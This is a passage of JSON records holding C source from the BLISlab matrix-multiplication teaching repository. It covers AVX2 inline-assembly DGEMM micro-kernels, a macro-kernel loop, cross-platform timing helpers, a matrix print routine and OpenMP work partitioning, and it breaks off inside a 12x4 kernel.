%%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm9,  %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm11, %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm13, %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\tDGEMM_INPUT_GS_BETA_NZ\n\t\"vfmadd213pd      %%ymm15, %%ymm3,  %%ymm0   \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"jmp    .DDONE                               \\n\\t\" // jump to end.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DCOLSTORED:                                \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps    (%%rcx),       %%ymm0            \\n\\t\"\n\t\"vfmadd213pd      %%ymm4,  %%ymm3,  %%ymm0   \\n\\t\"\n\t\"vmovaps          %%ymm0,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovaps    (%%rdx),       %%ymm1            \\n\\t\"\n\t\"vfmadd213pd      %%ymm5,  %%ymm3,  %%ymm1   \\n\\t\"\n\t\"vmovaps          %%ymm1,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps    (%%rcx),       %%ymm0            \\n\\t\"\n\t\"vfmadd213pd      %%ymm6,  %%ymm3,  %%ymm0   \\n\\t\"\n\t\"vmovaps          %%ymm0,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovaps    (%%rdx),       %%ymm1            \\n\\t\"\n\t\"vfmadd213pd      %%ymm7,  %%ymm3,  %%ymm1   \\n\\t\"\n\t\"vmovaps          %%ymm1,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps    (%%rcx),       %%ymm0            \\n\\t\"\n\t\"vfmadd213pd      %%ymm8,  %%ymm3,  %%ymm0   \\n\\t\"\n\t\"vmovaps          %%ymm0,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovaps    (%%rdx),       %%ymm1            \\n\\t\"\n\t\"vfmadd213pd      %%ymm9,  %%ymm3,  %%ymm1   \\n\\t\"\n\t\"vmovaps          %%ymm1,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps    (%%rcx),       %%ymm0            \\n\\t\"\n\t\"vfmadd213pd      %%ymm10, %%ymm3,  %%ymm0   \\n\\t\"\n\t\"vmovaps          %%ymm0,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovaps    (%%rdx),       %%ymm1            \\n\\t\"\n\t\"vfmadd213pd      %%ymm11, %%ymm3,  %%ymm1   \\n\\t\"\n\t\"vmovaps          %%ymm1,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps    (%%rcx),       %%ymm0            \\n\\t\"\n\t\"vfmadd213pd      %%ymm12, %%ymm3,  %%ymm0   \\n\\t\"\n\t\"vmovaps          %%ymm0,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovaps    (%%rdx),       %%ymm1            \\n\\t\"\n\t\"vfmadd213pd      %%ymm13, %%ymm3,  %%ymm1   \\n\\t\"\n\t\"vmovaps          %%ymm1,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps    (%%rcx),       %%ymm0            \\n\\t\"\n\t\"vfmadd213pd      %%ymm14, %%ymm3,  %%ymm0   \\n\\t\"\n\t\"vmovaps          %%ymm0,  (%%rcx)           \\n\\t\"\n\t//\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovaps    (%%rdx),       %%ymm1            \\n\\t\"\n\t\"vfmadd213pd      %%ymm15, %%ymm3,  %%ymm1   \\n\\t\"\n\t\"vmovaps          %%ymm1,  (%%rdx)           \\n\\t\"\n\t//\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"jmp    .DDONE                               \\n\\t\" // jump to end.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DBETAZERO:                                 \\n\\t\"\n\t\"                                            \\n\\t\" // check if aligned/column-stored\n\t\"andb     %%bl, %%bh                         \\n\\t\" // set ZF if bl & bh == 1.\n\t\"andb     %%bh, %%al                         \\n\\t\" // set ZF if bh & al == 1.\n\t\"jne     .DCOLSTORBZ                         \\n\\t\" // jump to column storage case\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DGENSTORBZ:                                \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           %%ymm4,  %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           %%ymm6,  %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           %%ymm8,  %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           %%ymm10, %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           %%ymm12, %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           %%ymm14, %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq      %%rdx, %%rcx                      \\n\\t\" // rcx = c + 4*rs_c\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           %%ymm5,  %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           %%ymm7,  %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           %%ymm9,  %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           %%ymm11, %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           %%ymm13, %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"addq      %%rdi, %%rcx                      \\n\\t\" // c += cs_c;\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps           %%ymm15, %%ymm0           \\n\\t\"\n\tDGEMM_OUTPUT_GS_BETA_NZ\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"jmp    .DDONE                               \\n\\t\" // jump to end.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DCOLSTORBZ:                                \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps          %%ymm4,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovaps          %%ymm5,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps          %%ymm6,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovaps          %%ymm7,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps          %%ymm8,  (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovaps          %%ymm9,  (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps          %%ymm10, (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovaps          %%ymm11, (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps          %%ymm12, (%%rcx)           \\n\\t\"\n\t\"addq      %%rdi, %%rcx                      \\n\\t\"\n\t\"vmovaps          %%ymm13, (%%rdx)           \\n\\t\"\n\t\"addq      %%rdi, %%rdx                      \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps          %%ymm14, (%%rcx)           \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"vmovaps          %%ymm15, (%%rdx)           \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\".DDONE:                                     \\n\\t\"\n\t\"                                            \\n\\t\"\n\n\t: // output operands (none)\n\t: // input operands\n\t  \"m\" (k_iter), // 0\n\t  \"m\" (k_left), // 1\n\t  \"m\" (a),      // 2\n\t  \"m\" (b),      // 3\n\t  \"m\" (alpha),  // 4\n\t  \"m\" (beta),   // 5\n\t  \"m\" (c),      // 6\n\t  \"m\" (rs_c),   // 7\n\t  \"m\" (cs_c)/*,   // 8\n\t  \"m\" (b_next), // 9\n\t  \"m\" (a_next)*/  // 10\n\t: // register clobber list\n\t  \"rax\", \"rbx\", \"rcx\", \"rdx\", \"rsi\", \"rdi\", \n\t  \"r8\", \"r9\", \"r10\", \"r11\", \"r12\", \"r13\", \"r14\", \"r15\",\n\t  \"xmm0\", \"xmm1\", \"xmm2\", \"xmm3\",\n\t  \"xmm4\", \"xmm5\", \"xmm6\", \"xmm7\",\n\t  \"xmm8\", \"xmm9\", \"xmm10\", \"xmm11\",\n\t  \"xmm12\", \"xmm13\", \"xmm14\", \"xmm15\",\n\t  \"memory\"\n\t);\n}", "path": "step4\\kernels\\bl_dgemm_asm_8x6.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "/*\n * --------------------------------------------------------------------------\n */\n", "func_signal": "void bl_macro_kernel(\n        int    m,\n        int    n,\n        int    k,\n        float *packA,\n        float *packB,\n        float *C,\n        int    ldc\n        )", "code": "{\n    int bl_ic_nt;\n    int    i, ii, j;\n    aux_t  aux;\n    char *str;\n\n    aux.b_next = packB;\n\n    // We can also parallelize with OMP here.\n    //// sequential is the default situation\n    //bl_ic_nt = 1;\n    //// check the environment variable\n    //str = getenv( \"BLISLAB_IC_NT\" );\n    //if ( str != NULL ) {\n    //    bl_ic_nt = (int)strtol( str, NULL, 10 );\n    //}\n    //#pragma omp parallel for num_threads( bl_ic_nt ) private( j, i, aux )\n    for ( j = 0; j < n; j += SGEMM_NR ) {                        // 2-th loop around micro-kernel\n        aux.n  = min( n - j, SGEMM_NR );\n        for ( i = 0; i < m; i += SGEMM_MR ) {                    // 1-th loop around micro-kernel\n            aux.m = min( m - i, SGEMM_MR );\n            if ( i + SGEMM_MR >= m ) {\n                aux.b_next += SGEMM_NR * k;\n            }\n\n            ( *bl_micro_kernel ) (\n                    k,\n                    &packA[ i * k ],\n                    &packB[ j * k ],\n                    &C[ j * ldc + i ],\n                    (unsigned long long) ldc,\n                    &aux\n                    );\n        }                                                        // 1-th loop around micro-kernel\n    }                                                            // 2-th loop around micro-kernel\n}", "path": "step5\\arm\\sgemm\\my_sgemm.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// --- Begin OSX build definitions -------------------------------------------\n", "func_signal": "double bl_clock_helper()", "code": "{\n    mach_timebase_info_data_t timebase;\n    mach_timebase_info( &timebase );\n\n    uint64_t nsec = mach_absolute_time();\n\n    double the_time = (double) nsec * 1.0e-9 * timebase.numer / timebase.denom;\n\n    if ( gtod_ref_time_sec == 0.0 )\n        gtod_ref_time_sec = the_time;\n\n    return the_time - gtod_ref_time_sec;\n}", "path": "common\\dgemm\\bl_dgemm_util_st.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "/*\n *\n *\n */\n", "func_signal": "void bl_dgemm_printmatrix(\n        double *A,\n        int    lda,\n        int    m,\n        int    n\n        )", "code": "{\n    int    i, j;\n    for ( i = 0; i < m; i ++ ) {\n        for ( j = 0; j < n; j ++ ) {\n            printf(\"%lf\\t\", A[j * lda + i]);\n        }\n        printf(\"\\n\");\n    }\n}", "path": "common\\dgemm\\bl_dgemm_util_st.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "/*\n *\n *\n */\n", "func_signal": "void bl_dgemm_printmatrix(\n        double *A,\n        int    lda,\n        int    m,\n        int    n\n        )", "code": "{\n    int    i, j;\n    for ( i = 0; i < m; i ++ ) {\n        for ( j = 0; j < n; j ++ ) {\n            printf(\"%lf\\t\", A[j * lda + i]);\n        }\n        printf(\"\\n\");\n    }\n}", "path": "common\\dgemm\\bl_dgemm_util_mt.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// --- Begin Windows build definitions -----------------------------------------\n", "func_signal": "double bl_clock_helper()", "code": "{\n    LARGE_INTEGER clock_freq = {0};\n    LARGE_INTEGER clock_val;\n    BOOL          r_val;\n\n    r_val = QueryPerformanceFrequency( &clock_freq );\n\n    if ( r_val == 0 )\n    {\n        fprintf( stderr, \"\\nblislab: %s (line %lu):\\nblislab: %s \\n\", __FILE__, __LINE__, \"QueryPerformanceFrequency() failed\" );\n        fflush( stderr );\n        abort();\n    }\n\n    r_val = QueryPerformanceCounter( &clock_val );\n\n    if ( r_val == 0 )\n    {\n        fprintf( stderr, \"\\nblislab: %s (line %lu):\\nblislab: %s \\n\", __FILE__, __LINE__, \"QueryPerformanceFrequency() failed\" );\n        fflush( stderr );\n        abort();\n    }\n\n    return ( ( double) clock_val.QuadPart / ( double) clock_freq.QuadPart );\n}", "path": "step4\\dgemm\\bl_dgemm_util.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// --- Begin Linux build definitions -------------------------------------------\n", "func_signal": "double bl_clock_helper()", "code": "{\n    double the_time, norm_sec;\n    struct timespec ts;\n\n    clock_gettime( CLOCK_MONOTONIC, &ts );\n\n    if ( gtod_ref_time_sec == 0.0 )\n        gtod_ref_time_sec = ( double ) ts.tv_sec;\n\n    norm_sec = ( double ) ts.tv_sec - gtod_ref_time_sec;\n\n    the_time = norm_sec + ts.tv_nsec * 1.0e-9;\n\n    return the_time;\n}", "path": "step4\\dgemm\\bl_dgemm_util.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// --- Begin OSX build definitions -------------------------------------------\n", "func_signal": "double bl_clock_helper()", "code": "{\n    mach_timebase_info_data_t timebase;\n    mach_timebase_info( &timebase );\n\n    uint64_t nsec = mach_absolute_time();\n\n    double the_time = (double) nsec * 1.0e-9 * timebase.numer / timebase.denom;\n\n    if ( gtod_ref_time_sec == 0.0 )\n        gtod_ref_time_sec = the_time;\n\n    return the_time - gtod_ref_time_sec;\n}", "path": "step1\\dgemm\\bl_dgemm_util.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// --- Begin Linux build definitions -------------------------------------------\n", "func_signal": "double bl_clock_helper()", "code": "{\n    double the_time, norm_sec;\n    struct timespec ts;\n\n    clock_gettime( CLOCK_MONOTONIC, &ts );\n\n    if ( gtod_ref_time_sec == 0.0 )\n        gtod_ref_time_sec = ( double ) ts.tv_sec;\n\n    norm_sec = ( double ) ts.tv_sec - gtod_ref_time_sec;\n\n    the_time = norm_sec + ts.tv_nsec * 1.0e-9;\n\n    return the_time;\n}", "path": "common\\dgemm\\bl_dgemm_util_st.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "/*\n *\n *\n */\n", "func_signal": "void bl_dgemm_printmatrix(\n        double *A,\n        int    lda,\n        int    m,\n        int    n\n        )", "code": "{\n    int    i, j;\n    for ( i = 0; i < m; i ++ ) {\n        for ( j = 0; j < n; j ++ ) {\n            printf(\"%lf\\t\", A[j * lda + i]);\n        }\n        printf(\"\\n\");\n    }\n}", "path": "step4\\dgemm\\bl_dgemm_util.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// --- Begin OSX build definitions -------------------------------------------\n", "func_signal": "double bl_clock_helper()", "code": "{\n    mach_timebase_info_data_t timebase;\n    mach_timebase_info( &timebase );\n\n    uint64_t nsec = mach_absolute_time();\n\n    double the_time = (double) nsec * 1.0e-9 * timebase.numer / timebase.denom;\n\n    if ( gtod_ref_time_sec == 0.0 )\n        gtod_ref_time_sec = the_time;\n\n    return the_time - gtod_ref_time_sec;\n}", "path": "common\\dgemm\\bl_dgemm_util_mt.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// --- Begin Windows build definitions -----------------------------------------\n", "func_signal": "double bl_clock_helper()", "code": "{\n    LARGE_INTEGER clock_freq = {0};\n    LARGE_INTEGER clock_val;\n    BOOL          r_val;\n\n    r_val = QueryPerformanceFrequency( &clock_freq );\n\n    if ( r_val == 0 )\n    {\n        fprintf( stderr, \"\\nblislab: %s (line %lu):\\nblislab: %s \\n\", __FILE__, __LINE__, \"QueryPerformanceFrequency() failed\" );\n        fflush( stderr );\n        abort();\n    }\n\n    r_val = QueryPerformanceCounter( &clock_val );\n\n    if ( r_val == 0 )\n    {\n        fprintf( stderr, \"\\nblislab: %s (line %lu):\\nblislab: %s \\n\", __FILE__, __LINE__, \"QueryPerformanceFrequency() failed\" );\n        fflush( stderr );\n        abort();\n    }\n\n    return ( ( double) clock_val.QuadPart / ( double) clock_freq.QuadPart );\n}", "path": "common\\dgemm\\bl_dgemm_util_st.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// Code for work assignments\n", "func_signal": "void bl_get_range( int n, int bf, int* start, int* end )", "code": "{\n\t//int      n_way      = thread->n_way;\n\t//int      work_id    = thread->work_id;\n    int      n_way      = omp_get_num_threads();\n    int      work_id    = omp_get_thread_num();\n\n\n    //printf( \"n: %d, bf: %d, start: %d, end: %d, n_way: %d, work_id: %d\\n,\", n, bf, *start, *end, n_way, work_id );\n\n\tint      all_start  = 0;\n\tint      all_end    = n;\n\n\tint      size       = all_end - all_start;\n\n\tint      n_bf_whole = size / bf;\n\tint      n_bf_left  = size % bf;\n\n\tint      n_bf_lo    = n_bf_whole / n_way;\n\tint      n_bf_hi    = n_bf_whole / n_way;\n\n\t// In this function, we partition the space between all_start and\n\t// all_end into n_way partitions, each a multiple of block_factor\n\t// with the exception of the one partition that recieves the\n\t// \"edge\" case (if applicable).\n\t//\n\t// Here are examples of various thread partitionings, in units of\n\t// the block_factor, when n_way = 4. (A '+' indicates the thread\n\t// that receives the leftover edge case (ie: n_bf_left extra\n\t// rows/columns in its sub-range).\n\t//                                        (all_start ... all_end)\n\t// n_bf_whole  _left  hel  n_th_lo  _hi   thr0  thr1  thr2  thr3\n\t//         12     =0    f        0    4      3     3     3     3\n\t//         12     >0    f        0    4      3     3     3     3+\n\t//         13     >0    f        1    3      4     3     3     3+\n\t//         14     >0    f        2    2      4     4     3     3+\n\t//         15     >0    f        3    1      4     4     4     3+\n\t//         15     =0    f        3    1      4     4     4     3 \n\t//\n\t//         12     =0    t        4    0      3     3     3     3\n\t//         12     >0    t        4    0      3+    3     3     3\n\t//         13     >0    t        3    1      3+    3     3     4\n\t//         14     >0    t        2    2      3+    3     4     4\n\t//         15     >0    t        1    3      3+    4     4     4\n\t//         15     =0    t        1    3      3     4     4     4\n\n\t// As indicated by the table above, load is balanced as equally\n\t// as possible, even in the presence of an edge case.\n\n\t// First, we must differentiate between cases where the leftover\n\t// \"edge\" case (n_bf_left) should be allocated to a thread partition\n\t// at the low end of the index range or the high end.\n\n\t\t// Notice that if all threads receive the same number of\n\t\t// block_factors, those threads are considered \"high\" and\n\t\t// the \"low\" thread group is empty.\n\t\tint n_th_lo = n_bf_whole % n_way;\n\t\t//int n_th_hi = n_way - n_th_lo;\n\n\t\t// If some partitions must have more block_factors than others\n\t\t// assign the slightly larger partitions to lower index threads.\n\t\tif ( n_th_lo != 0 ) n_bf_lo += 1;\n\n\t\t// Compute the actual widths (in units of rows/columns) of\n\t\t// individual threads in the low and high groups.\n\t\tint size_lo = n_bf_lo * bf;\n\t\tint size_hi = n_bf_hi * bf;\n\n\t\t// Precompute the starting indices of the low and high groups.\n\t\tint lo_start = all_start;\n\t\tint hi_start = all_start + n_th_lo * size_lo;\n\n\t\t// Compute the start and end of individual threads' ranges\n\t\t// as a function of their work_ids and also the group to which\n\t\t// they belong (low or high).\n\t\tif ( work_id < n_th_lo )\n\t\t{\n\t\t\t*start = lo_start + (work_id  ) * size_lo;\n\t\t\t*end   = lo_start + (work_id+1) * size_lo;\n\t\t}\n\t\telse // if ( n_th_lo <= work_id )\n\t\t{\n\t\t\t*start = hi_start + (work_id-n_th_lo  ) * size_hi;\n\t\t\t*end   = hi_start + (work_id-n_th_lo+1) * size_hi;\n\n\t\t\t// Since the edge case is being allocated to the high\n\t\t\t// end of the index range, we have to advance the last\n\t\t\t// thread's end.\n\t\t\tif ( work_id == n_way - 1 ) *end += n_bf_left;\n\t\t}\n\t\n}", "path": "common\\dgemm\\bl_dgemm_util_mt.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// --- Begin Windows build definitions -----------------------------------------\n", "func_signal": "double bl_clock_helper()", "code": "{\n    LARGE_INTEGER clock_freq = {0};\n    LARGE_INTEGER clock_val;\n    BOOL          r_val;\n\n    r_val = QueryPerformanceFrequency( &clock_freq );\n\n    if ( r_val == 0 )\n    {\n        fprintf( stderr, \"\\nblislab: %s (line %lu):\\nblislab: %s \\n\", __FILE__, __LINE__, \"QueryPerformanceFrequency() failed\" );\n        fflush( stderr );\n        abort();\n    }\n\n    r_val = QueryPerformanceCounter( &clock_val );\n\n    if ( r_val == 0 )\n    {\n        fprintf( stderr, \"\\nblislab: %s (line %lu):\\nblislab: %s \\n\", __FILE__, __LINE__, \"QueryPerformanceFrequency() failed\" );\n        fflush( stderr );\n        abort();\n    }\n\n    return ( ( double) clock_val.QuadPart / ( double) clock_freq.QuadPart );\n}", "path": "common\\dgemm\\bl_dgemm_util_mt.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// --- Begin Linux build definitions -------------------------------------------\n", "func_signal": "double bl_clock_helper()", "code": "{\n    double the_time, norm_sec;\n    struct timespec ts;\n\n    clock_gettime( CLOCK_MONOTONIC, &ts );\n\n    if ( gtod_ref_time_sec == 0.0 )\n        gtod_ref_time_sec = ( double ) ts.tv_sec;\n\n    norm_sec = ( double ) ts.tv_sec - gtod_ref_time_sec;\n\n    the_time = norm_sec + ts.tv_nsec * 1.0e-9;\n\n    return the_time;\n}", "path": "step1\\dgemm\\bl_dgemm_util.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "// --- Begin Windows build definitions -----------------------------------------\n", "func_signal": "double bl_clock_helper()", "code": "{\n    LARGE_INTEGER clock_freq = {0};\n    LARGE_INTEGER clock_val;\n    BOOL          r_val;\n\n    r_val = QueryPerformanceFrequency( &clock_freq );\n\n    if ( r_val == 0 )\n    {\n        fprintf( stderr, \"\\nblislab: %s (line %lu):\\nblislab: %s \\n\", __FILE__, __LINE__, \"QueryPerformanceFrequency() failed\" );\n        fflush( stderr );\n        abort();\n    }\n\n    r_val = QueryPerformanceCounter( &clock_val );\n\n    if ( r_val == 0 )\n    {\n        fprintf( stderr, \"\\nblislab: %s (line %lu):\\nblislab: %s \\n\", __FILE__, __LINE__, \"QueryPerformanceFrequency() failed\" );\n        fflush( stderr );\n        abort();\n    }\n\n    return ( ( double) clock_val.QuadPart / ( double) clock_freq.QuadPart );\n}", "path": "step1\\dgemm\\bl_dgemm_util.c", "repo_name": "flame/blislab", "stars": 344, "license": "None", "language": "c", "size": 7126}
{"docstring": "/*\\\n\t\"vextractf128  $1, %%ymm2,  %%xmm1           \\n\\t\" \\\n\t\"vmovlpd           %%xmm2,  (%%rcx,%%rsi,4)  \\n\\t\" \\\n\t\"vmovhpd           %%xmm2,  (%%rcx,%%r15  )  \\n\\t\" \\\n\t\"vmovlpd           %%xmm1,  (%%rcx,%%r13,2)  \\n\\t\" \\\n\t\"vmovhpd           %%xmm1,  (%%rcx,%%r10  )  \\n\\t\"*/\n", "func_signal": "void bl_dgemm_asm_12x4(\n                         int              k,\n                         double*   a,\n                         double*   b,\n                         double*   c,\n                         inc_t              ldc,\n                         aux_t*         data\n                       )", "code": "{\n\t//void*   a_next = bli_auxinfo_next_a( data );\n\t//void*   b_next = bli_auxinfo_next_b( data );\n\n    const inc_t cs_c = ldc;\n    const inc_t rs_c = 1;\n    double alpha_val = 1.0, beta_val = 1.0;\n    double *alpha, *beta;\n\n    alpha = &alpha_val;\n    beta  = &beta_val;\n\n\tdim_t   k_iter = (unsigned long long)k / 4;\n\tdim_t   k_left = (unsigned long long)k % 4;\n\n\t__asm__ volatile\n\t(\n\t\"                                            \\n\\t\"\n\t\"vzeroall                                    \\n\\t\" // zero all xmm/ymm registers.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq                %2, %%rax               \\n\\t\" // load address of a.\n\t\"movq                %3, %%rbx               \\n\\t\" // load address of b.\n\t//\"movq                %9, %%r15               \\n\\t\" // load address of b_next.\n\t\"                                            \\n\\t\"\n\t\"                                            \\n\\t\" // initialize loop by pre-loading\n\t\"vmovapd            0 * 32(%%rax), %%ymm0    \\n\\t\"\n\t\"vmovapd            1 * 32(%%rax), %%ymm1    \\n\\t\"\n\t\"vmovapd            2 * 32(%%rax), %%ymm2    \\n\\t\"\n\t\"                                            \\n\\t\"\n\t\"movq                %6, %%rcx               \\n\\t\" // load address of c\n\t\"movq                %8, %%rdi               \\n\\t\" // load cs_c\n\t\"leaq        (,%%rdi,8), %%rdi               \\n\\t\" // cs_c *= sizeof(double)\n\t\"                                            \\n\\t\"\n\t\"leaq   (%%rdi,%%rdi,2), %%r13               \\n\\t\" // r13 = 3*cs_c;\n\t\"prefetcht0   7 * 8(%%rcx)                   \\n\\t\" // prefetch c + 0*cs_c\n\t\"prefetcht0   7 * 8(%%rcx,%%rdi)      